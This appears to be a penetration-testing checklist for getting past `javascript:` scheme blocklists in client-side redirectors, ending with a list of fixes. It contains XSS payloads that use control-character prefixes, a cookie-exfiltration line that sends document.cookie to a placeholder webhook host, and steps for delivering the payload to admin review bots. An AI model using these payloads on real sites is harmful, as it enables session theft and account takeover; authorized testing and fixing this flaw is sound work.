# JavaScript Scheme Blocklist Bypass Recon Checklist

## Goal

Determine whether a client-side redirector or navigation helper blocklists `javascript:` on the raw string but still allows browser-normalized variants to execute.

## 1. Scope Confirmation

- Confirm lab, owned app, in-scope target, or defensive review.
- Record host, date, redirect parameter, and any report/admin-review flow.
- Do not copy live flags, cookies, tokens, or private URLs into reusable notes.

Record:

```text
Target:
Redirect parameter:
Blocklist shown:
Date:
Bot/report feature:
```

## 2. Read The Redirect Source

Look for:

- `/^javascript:/i`
- `.trim()` before validation
- `new URL()` parsing
- direct assignment to `location.href`, `location`, or `window.open`
- auto-trigger on page load from a query parameter

Record:

```text
Regex/filter:
Normalization before check: yes/no
Navigation sink:
Auto-run from query string: yes/no
```

## 3. Build Minimal Bypass Variants

Test one prefix at a time:

```text
\njavascript:alert(1)
\tjavascript:alert(1)
\rjavascript:alert(1)
\fjavascript:alert(1)
 javascript:alert(1)
```

Wrap them in the real page URL if needed:

```text
https://[host]/?redirect_uri=%0Ajavascript:alert(1)
```

Record:

```text
Payload:
Blocked by regex: yes/no
Reached sink: yes/no
Execution signal:
```

## 4. Confirm Execution Without Guessing

Prefer a harmless local side effect before exfiltration:

```text
\njavascript:document.body.setAttribute("data-pwned","1")
```

Record:

```text
Side effect used:
Observed result:
```

## 5. Check Victim Delivery Path

Look for:

- report URL forms
- admin review queues
- support preview endpoints
- same-origin visit restrictions

Record:

```text
Report endpoint:
Accepts same-origin wrapper URL: yes/no
Direct external URL allowed: yes/no
```

## 6. Exfiltrate Minimal Proof

Preferred order:

1. local execution proof
2. `document.cookie` exfil if readable
3. same-origin fetch of admin-only content if cookies are `HttpOnly`

Generic exfil form:

```text
\njavascript:fetch('https://[webhook]?c='+encodeURIComponent(document.cookie))
```

## 7. Explain The Parser Mismatch

Document:

```text
What the regex sees:
What the browser normalizes to:
Why they differ:
Sink reached:
```

## 8. Fix Checklist

- Trim and normalize before validation.
- Parse every candidate with `new URL()`.
- Enforce a strict scheme allowlist such as only `https:`.
- Reject active schemes after normalization.
- Avoid direct navigation to attacker-controlled strings.

## Decision Checklist

- [ ] Redirect source reviewed.
- [ ] Literal `javascript:` blocked.
- [ ] One control-character variant tested.
- [ ] Execution confirmed or ruled out.
- [ ] Victim delivery path confirmed.
- [ ] Minimal proof captured.
- [ ] Root cause documented as raw-string regex versus browser normalization.
- [ ] Reusable notes exclude live secrets.
